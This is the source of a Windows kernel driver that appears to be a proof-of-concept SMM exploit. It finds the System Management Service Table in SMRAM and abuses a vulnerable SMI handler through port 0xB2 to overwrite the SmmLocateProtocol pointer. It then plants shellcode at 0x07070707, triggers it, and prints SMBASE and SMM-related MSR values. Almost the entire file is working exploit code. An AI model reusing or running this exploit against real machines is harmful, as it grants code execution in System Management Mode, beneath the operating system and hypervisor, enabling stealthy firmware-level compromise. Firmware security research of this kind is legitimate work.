#include "demo.hpp"
#include "PhysicalMemory.hpp"
#include "SmmShellCode.hpp"

NTSTATUS
FindSystemManagementServiceTable (
    const PhysicalMemory& Pm,
    PULONG64 SmstAddress
    );

static
NTSTATUS
SetSmmWriteDestination (
    const PhysicalMemory& Pm,
    ULONG64 AddressToWrite
    )
{
    AddressToWrite -= 2;
    return Pm.Write(0x104, &AddressToWrite, sizeof(AddressToWrite));
}

static
void
ExecuteWrite07WithSmm (
    )
{
    __outbyte(0xb2, 0x40);  // SdioSmm
}

static
NTSTATUS
Write07070707WithSmm (
    const PhysicalMemory& Pm,
    ULONG64 AddressToWrite
    )
{
    NTSTATUS status;

    for (ULONG64 offset = 0; offset < 4; ++offset)
    {
        status = SetSmmWriteDestination(Pm, AddressToWrite + offset);
        if (!NT_SUCCESS(status))
        {
            DEMO_ERROR("SetWriteDestination failed : %08x", status);
            goto Exit;
        }
        ExecuteWrite07WithSmm();
    }

Exit:
    return status;
}

static
NTSTATUS
PatchSmstSmmLocateProtocolAddress (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    ULONG64 addressOfSmst;
    ULONG64 addressOfSmmLocateProtocolField;

    //
    // Find the address of SMST
    //
    status = FindSystemManagementServiceTable(Pm, &addressOfSmst);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("FindSystemManagementServiceTable failed : %08x", status);
        goto Exit;
    }

    //
    // Patch contents of SMST->SmmLocateProtocol to 0x07070707
    //
    addressOfSmmLocateProtocolField = addressOfSmst + 0xd0;
    status = Write07070707WithSmm(Pm, addressOfSmmLocateProtocolField);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("FindSystemManagementServiceTable failed : %08x", status);
        goto Exit;
    }

Exit:
    return status;
}

static
NTSTATUS
ExecuteShellCode (
    )
{
    __outbyte(0xb2, 0xdf);  // OA3_SMM
    return STATUS_SUCCESS;
}

static
NTSTATUS
DumpSmmExploitOuput (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK block;

    status = Pm.Read(&block, 0, sizeof(block));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ReadFromPhysicalMemory failed : %08x", status);
        goto Exit;
    }

    if (block.Smbase == 0)
    {
        DEMO_ERROR("Shell code did not run??");
        status = STATUS_UNSUCCESSFUL;
        goto Exit;
    }

    DEMO_INFO("IA32_SMBASE             = 0x%llx", block.Smbase);
    DEMO_INFO("MSR_SMM_FEATURE_CONTROL = 0x%llx", block.SmmFeatureControl);
    DEMO_INFO("MSR_SMM_MCA_CAP         = 0x%llx", block.SmmMcaCap);
    if (block.Eptp == MAXULONG64)
    {
        DEMO_INFO("EPT pointer             = Not available");
    }
    else
    {
        DEMO_INFO("EPT pointer             = 0x%llx", block.Eptp);
    }

Exit:
    return status;
}

static
NTSTATUS
ExploitSmm (
    )
{
    NTSTATUS status;
    PhysicalMemory pm;
    SmmShellCode shellcode;

    status = pm.Initialize();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("PhysicalMemory::Initialize failed : %08x", status);
        goto Exit;
    }

    //
    // (1) Find the address of the System Management Service Table (SMST) in SMRAM
    // (2) Overwrite the pointer to the SmmLocateProtocol function
    //
    status = PatchSmstSmmLocateProtocolAddress(pm);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("PatchSmstSmmLocateProtocolAddress failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Patched SMST->SmmLocateProtocol in SMRAM");

    //
    // (3) Write shellcode at physical memory 0x07070707
    //
    status = shellcode.Install(pm);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("SmmShellCode::Install failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Placed SMM shell code");

    //
    // (4) Trigger another SMI that calls the Smst->SmmLocateProtocol
    //
    status = ExecuteShellCode();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ExecuteShellCode failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Triggered SMM exploit");

    //
    // Display results of shellcode
    //
    status = DumpSmmExploitOuput(pm);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("VerifyExploitation failed : %08x", status);
        goto Exit;
    }

    DEMO_INFO("Successfully executed shell code in SMM. Failing DriverEntry to unload itself");

Exit:
    return status;
}

EXTERN_C
NTSTATUS
DriverEntry (
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
    )
{
    NTSTATUS status;
    KAFFINITY previousAffinity;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    //
    // Break into the debugger only if attached, with a Debug build.
    //
    if (KdDebuggerNotPresent == FALSE)
    {
        KdBreakPoint();
    }

    //
    // I do not think it matters but emulate a single logical core system so that
    // cache visibility would not step into and cause a problem.
    //
    previousAffinity = KeSetSystemAffinityThreadEx(static_cast<KAFFINITY>(1));

    //
    // Exploit the vulnerability.
    //
    status = ExploitSmm();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ExploitSmm failed : %08x", status);
        goto Exit;
    }

    status = STATUS_CANCELLED;

Exit:
    KeRevertToUserAffinityThreadEx(previousAffinity);
    return status;
}